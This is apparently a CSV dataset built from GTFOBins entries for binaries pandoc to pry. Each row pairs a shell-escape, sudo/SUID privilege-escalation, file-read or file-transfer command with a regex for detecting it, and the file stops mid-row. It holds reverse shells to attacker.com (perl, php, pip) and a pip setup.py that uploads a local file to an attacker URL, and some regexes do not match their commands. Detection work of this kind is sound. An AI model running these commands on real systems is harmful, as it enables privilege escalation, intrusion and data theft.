pandoc,suid,"echo DATA | ./pandoc -t plain -o ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?pandoc\s*\-t\s*\-o\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
pandoc,limited-suid,"echo 'os.execute(""/bin/sh"")' >$TF
./pandoc -L $TF /dev/null","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?pandoc\s*\-L\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Pandoc has a builtin [`lua`](/gtfobins/lua/) interpreter for writing filters, other functions might apply."
pandoc,sudo,"echo 'os.execute(""/bin/sh"")' >$TF
sudo pandoc -L $TF /dev/null","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?pandoc\s*\-L\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Pandoc has a builtin [`lua`](/gtfobins/lua/) interpreter for writing filters, other functions might apply."
paste,file-read,paste $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?paste\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
paste,suid,paste $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?paste\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
paste,sudo,sudo paste $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?paste\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
pax,file-read,"pax -w ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?pax\s*\-w\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","The output is a `tar` archive containing the read file as it is, hence this may not be suitable to read arbitrary binary files."
pdb,shell,"echo 'import os; os.system(""/bin/sh"")' > $TF
pdb $TF
cont","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?pdb\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)).*(?:\bimport\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
pdb,sudo,"echo 'import os; os.system(""/bin/sh"")' > $TF
sudo pdb $TF
cont","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?pdb\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)).*(?:\bimport\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
pdflatex,shell,pdflatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?pdflatex\s*\-\-shell\-escape\s+(?:/bin/(?:sh|bash)).*(?:\bBEGIN\b)),
pdflatex,file-read,"pdflatex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{file_to_read}\end{document}'
pdftotext article.pdf -","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?pdflatex\s+(?:\bBEGIN\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",The read file will be part of the output.
pdflatex,sudo,"sudo pdflatex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{file_to_read}\end{document}'
pdftotext article.pdf -","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?pdflatex\s+(?:\bBEGIN\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",The read file will be part of the output.
pdflatex,sudo,sudo pdflatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?pdflatex\s*\-\-shell\-escape\s+(?:/bin/(?:sh|bash)).*(?:\bBEGIN\b)),
pdflatex,limited-suid,./pdflatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?pdflatex\s*\-\-shell\-escape\s+(?:/bin/(?:sh|bash)).*(?:\bBEGIN\b)),
pdftex,shell,pdftex --shell-escape '\write18{/bin/sh}\end',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?pdftex\s*\-\-shell\-escape\s+(?:/bin/(?:sh|bash))),
pdftex,sudo,sudo pdftex --shell-escape '\write18{/bin/sh}\end',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?pdftex\s*\-\-shell\-escape\s+(?:/bin/(?:sh|bash))),
pdftex,limited-suid,./pdftex --shell-escape '\write18{/bin/sh}\end',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?pdftex\s*\-\-shell\-escape\s+(?:/bin/(?:sh|bash))),
perf,shell,perf stat /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?perf\s+(?:/bin/(?:sh|bash))),
perf,suid,./perf stat /bin/sh -p,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?perf\s*\-p\s+(?:/bin/(?:sh|bash))),
perf,sudo,sudo perf stat /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?perf\s+(?:/bin/(?:sh|bash))),
perl,shell,"perl -e 'exec ""/bin/sh"";'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?perl\s*\-e\s+(?:/bin/(?:sh|bash))),
perl,file-read,perl -ne print $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?perl\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
perl,reverse-shell,"export RHOST=attacker.com
export RPORT=12345
perl -e 'use Socket;$i=""$ENV{RHOST}"";$p=$ENV{RPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?perl\s*\-e\s*\-i\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)).*(?:\bsocket\b|\bfsockopen\b|\bconnect\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Run `nc -l -p 12345` on the attacker box to receive the shell.
perl,suid,"./perl -e 'exec ""/bin/sh"";'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?perl\s*\-e\s+(?:/bin/(?:sh|bash))),
perl,sudo,"sudo perl -e 'exec ""/bin/sh"";'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?perl\s*\-e\s+(?:/bin/(?:sh|bash))),
perl,capabilities,"./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec ""/bin/sh"";'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?perl\s*\-e\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
perlbug,shell,perlbug -s 'x x x' -r x -c x -e 'exec /bin/sh;',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?perlbug\s*\-s\s*\-r\s*\-c\s*\-e\s+(?:/bin/(?:sh|bash))),
perlbug,sudo,sudo perlbug -s 'x x x' -r x -c x -e 'exec /bin/sh;',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?perlbug\s*\-s\s*\-r\s*\-c\s*\-e\s+(?:/bin/(?:sh|bash))),
pexec,shell,pexec /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?pexec\s+(?:/bin/(?:sh|bash))),
pexec,suid,./pexec /bin/sh -p,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?pexec\s*\-p\s+(?:/bin/(?:sh|bash))),
pexec,sudo,sudo pexec /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?pexec\s+(?:/bin/(?:sh|bash))),
pg,shell,"pg /etc/profile
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?pg\s+(?:/bin/(?:sh|bash))),
pg,file-read,pg file_to_read,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?pg\s+.+),
pg,sudo,"sudo pg /etc/profile
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?pg\s+(?:/bin/(?:sh|bash))),
pg,suid,./pg file_to_read,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?pg\s+.+),
php,shell,"export CMD=""/bin/sh""
php -r 'system(getenv(""CMD""));'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?php\s*\-r\s+(?:getenv\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\)).*(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
php,shell,"export CMD=""/bin/sh""
php -r 'passthru(getenv(""CMD""));'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?php\s*\-r\s+(?:getenv\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\)).*(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
php,shell,"export CMD=""/bin/sh""
php -r 'print(shell_exec(getenv(""CMD"")));'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?php\s*\-r\s+(?:getenv\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\)).*(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
php,shell,"export CMD=""/bin/sh""
php -r '$r=array(); exec(getenv(""CMD""), $r); print(join(""\\n"",$r));'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?php\s*\-r\s+(?:getenv\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\)).*(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
php,shell,"export CMD=""/bin/sh""
php -r '$h=@popen(getenv(""CMD""),""r""); if($h){ while(!feof($h)) echo(fread($h,4096)); pclose($h); }'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?php\s*\-r\s+(?:getenv\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\)).*(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
php,command,"export CMD=""id""
php -r '$p = array(array(""pipe"",""r""),array(""pipe"",""w""),array(""pipe"", ""w""));$h = @proc_open(getenv(""CMD""), $p, $pipes);if($h&&$pipes){while(!feof($pipes[1])) echo(fread($pipes[1],4096));while(!feof($pipes[2])) echo(fread($pipes[2],4096));fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($h);}'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?php\s*\-r\s+(?:getenv\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\)).*(?:proc_open\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
php,reverse-shell,"export RHOST=attacker.com
export RPORT=12345
php -r '$sock=fsockopen(getenv(""RHOST""),getenv(""RPORT""));exec(""/bin/sh -i <&3 >&3 2>&3"");'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?php\s*\-r\s*\-i\s+(?:getenv\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\)).*(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:fsockopen\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))).*(?:/bin/(?:sh|bash)).*(?:\bsocket\b|\bfsockopen\b|\bconnect\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Run `nc -l -p 12345` on the attacker box to receive the shell.
php,file-upload,php -S $LHOST:$LPORT,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?php\s*\-S\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Serve files in the local folder running an HTTP server. This requires PHP version 5.4 or later.
php,file-download,"export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
php -r '$c=file_get_contents(getenv(""URL""));file_put_contents(getenv(""LFILE""), $c);'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?php\s*\-r\s+(?:getenv\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Fetch a remote file via HTTP GET request.
php,suid,"./php -r ""pcntl_exec('/bin/sh', ['-p']);""",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?php\s*\-r\s+(?:/bin/(?:sh|bash))),
php,sudo,"sudo php -r ""system('$CMD');""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?php\s*\-r\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
php,capabilities,"./php -r ""posix_setuid(0); system('$CMD');""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?php\s*\-r\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
php,file-read,"export LFILE=file_to_read
php -r 'readfile(getenv(""LFILE""));'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?php\s*\-r\s+(?:getenv\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
php,file-write,"export LFILE=file_to_write
php -r 'file_put_contents(getenv(""LFILE""), ""DATA"");'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?php\s*\-r\s+(?:getenv\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","write data to a file, filename should be absolute."
pic,file-read,pic $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?pic\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",The output is prefixed with a some content as a header.
pic,shell,"pic -U
.PS
sh X sh X","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?pic\s*\-U\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
pic,sudo,"sudo pic -U
.PS
sh X sh X","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?pic\s*\-U\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
pic,limited-suid,"./pic -U
.PS
sh X sh X","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?pic\s*\-U\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
pico,shell,"pico
^R^X
reset; sh 1>&0 2>&0",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?pico\s+.+),
pico,shell,"pico -s /bin/sh
/bin/sh
^T",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?pico\s*\-s\s+(?:/bin/(?:sh|bash))),The `SPELL` environment variable can be used in place of the `-s` option if the command line cannot be changed.
pico,file-write,"pico file_to_write
DATA
^O","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?pico\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
pico,file-read,pico file_to_read,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?pico\s+.+),
pico,limited-suid,"./pico -s /bin/sh
/bin/sh
^T",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?pico\s*\-s\s+(?:/bin/(?:sh|bash))),The `SPELL` environment variable can be used in place of the `-s` option if the command line cannot be changed.
pico,sudo,"sudo pico
^R^X
reset; sh 1>&0 2>&0",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?pico\s+.+),
pidstat,command,pidstat -e $COMMAND,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?pidstat\s*\-e\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
pidstat,sudo,sudo pidstat -e $COMMAND,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?pidstat\s*\-e\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
pidstat,suid,./pidstat -e $COMMAND,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?pidstat\s*\-e\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
pip,shell,"echo ""import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')"" > $TF/setup.py
pip install $TF","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?pip\s+(?:/bin/(?:sh|bash)).*(?:\bimport\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
pip,reverse-shell,"export RHOST=attacker.com
export RPORT=12345
TF=$(mktemp -d)
echo 'import sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv(""RHOST""),int(os.getenv(""RPORT""))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn(""/bin/sh"")' > $TF/setup.py
pip install $TF","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?pip\s*\-d\s+(?:getenv\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\)).*(?:/bin/(?:sh|bash)).*(?:\bsocket\b|\bfsockopen\b|\bconnect\b).*(?:\bimport\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell."
pip,file-upload,"export URL=http://attacker.com/
export LFILE=file_to_send
TF=$(mktemp -d)
echo 'import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
else: import urllib as u, urllib2 as r
r.urlopen(e[""URL""], bytes(u.urlencode({""d"":open(e[""LFILE""]).read()}).encode()))' > $TF/setup.py
pip install $TF","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?pip\s*\-d\s+(?:\bimport\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Send local file via ""d"" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file."
pip,file-upload,"export LPORT=8888
TF=$(mktemp -d)
echo 'import sys; from os import environ as e
if sys.version_info.major == 3: import http.server as s, socketserver as ss
else: import SimpleHTTPServer as s, SocketServer as ss
ss.TCPServer(("""", int(e[""LPORT""])), s.SimpleHTTPRequestHandler).serve_forever()' > $TF/setup.py
pip install $TF","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?pip\s*\-d\s+(?:\bimport\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Serve files in the local folder running an HTTP server.
pip,file-download,"export URL=http://attacker.com/file_to_get
export LFILE=/tmp/file_to_save
TF=$(mktemp -d)
echo 'import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r
else: import urllib as r
r.urlretrieve(e[""URL""], e[""LFILE""])' > $TF/setup.py
pip install $TF","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?pip\s*\-d\s+(?:\bimport\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Fetch a remote file via HTTP GET request. It needs an absolute local file path.
pip,file-write,"export LFILE=/tmp/file_to_save
TF=$(mktemp -d)
echo ""open('$LFILE','w+').write('DATA')"" > $TF/setup.py
pip install $TF","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?pip\s*\-d\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",It needs an absolute local file path.
pip,file-read,"echo 'raise Exception(open(""file_to_read"").read())' > $TF/setup.py
pip install $TF","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?pip\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",The read file content is corrupted as wrapped within an exception error.
pip,library-load,"echo 'from ctypes import cdll; cdll.LoadLibrary(""lib.so"")' > $TF/setup.py
pip install $TF","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?pip\s+(?:\bimport\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
pip,sudo,"echo ""import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')"" > $TF/setup.py
sudo pip install $TF","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?pip\s+(?:/bin/(?:sh|bash)).*(?:\bimport\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
pkexec,sudo,sudo pkexec /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?pkexec\s+(?:/bin/(?:sh|bash))),
pkg,sudo,sudo pkg install -y --no-repo-update ./x-1.0.txz,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?pkg\s*\-y\s*\-\-no\-repo\-update\s+.+),"It runs commands using a specially crafted FreeBSD package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.
```
TF=$(mktemp -d)
echo 'id' > $TF/x.sh
fpm -n x -s dir -t freebsd -a all --before-install $TF/x.sh $TF
```
"
posh,shell,posh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?posh\s+.+),
posh,limited-suid,./posh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?posh\s+.+),
posh,sudo,sudo posh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?posh\s+.+),
pr,file-read,pr -T $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?pr\s*\-T\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
pr,suid,pr -T $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?pr\s*\-T\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
pr,sudo,pr -T $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?pr\s*\-T\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
pry,shell,"pry
